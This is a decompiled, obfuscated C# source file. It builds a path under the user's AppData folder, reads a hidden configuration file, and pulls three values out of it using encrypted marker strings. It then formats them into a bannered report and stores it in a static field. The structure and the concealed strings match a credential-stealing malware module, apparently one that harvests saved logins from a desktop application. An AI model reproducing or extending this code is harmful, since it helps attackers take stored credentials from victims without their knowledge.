using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns4;

namespace ns1;

internal class Class9
{
	public class Class10
	{
		public static void smethod_0()
		{
			try
			{
				string string_ = Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Interaction.Environ("Username"), Class6.smethod_0("bLK9eJ+eq8PLHw==", "False"), 1, -1, (CompareMethod)0) + Class6.smethod_0("jZDQzJR/n7OzwJWty8PCja/GzLaas4XCyZ+wxdEZ", "False");
				string string_2 = smethod_1(string_);
				string text = smethod_2(string_2, Class6.smethod_0("maHT3tGxtgo=", "False"), Class6.smethod_0("W6Kzs6tVLw==", "False"));
				string text2 = smethod_2(string_2, Class6.smethod_0("bqekuKZ6oaSDMQ==", "False"), Environment.NewLine);
				string text3 = smethod_2(string_2, Class6.smethod_0("kLzZ4NavzcqqCg==", "False"), Environment.NewLine);
				string text4 = (string_0 = ((Operators.CompareString(text3, "", false) == 0) ? (Class6.smethod_0("ZoGMk4VmgYyThWaBk8+2bbLCk4VmgYyThWaBjJOFZoEf", "False") + Environment.NewLine + Environment.NewLine + Class6.smethod_0("arq6gImUtGyAZXSwbKWqibC+t7hGh7vIs4oh", "False") + Environment.NewLine + Environment.NewLine + Class6.smethod_0("a4aRmIprhpGYimuGkZiKa4aRmIprhpGYimuGkZiKa4Ya", "False")) : (Class6.smethod_0("ZoGMk4VmgYyThWaBk8+2bbLCk4VmgYyThWaBjJOFZoEf", "False") + Environment.NewLine + Environment.NewLine + Class6.smethod_0("fb/O1sdvcBM=", "False") + text + Environment.NewLine + Class6.smethod_0("d7CtwXtCJQ==", "False") + text2 + Environment.NewLine + Class6.smethod_0("g8W9mnIT", "False") + text3 + Environment.NewLine + Environment.NewLine + Class6.smethod_0("a4aRmIprhpGYimuGkZiKa4aRmIprhpGYimuGkZiKa4Ya", "False"))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string smethod_1(string string_0)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(string_0);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string smethod_2(string string_0, string string_1, string string_2)
		{
			string result = default(string);
			try
			{
				string[] array = Strings.Split(string_0, string_1, -1, (CompareMethod)0);
				string[] array2 = Strings.Split(array[1], string_2, -1, (CompareMethod)0);
				result = array2[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
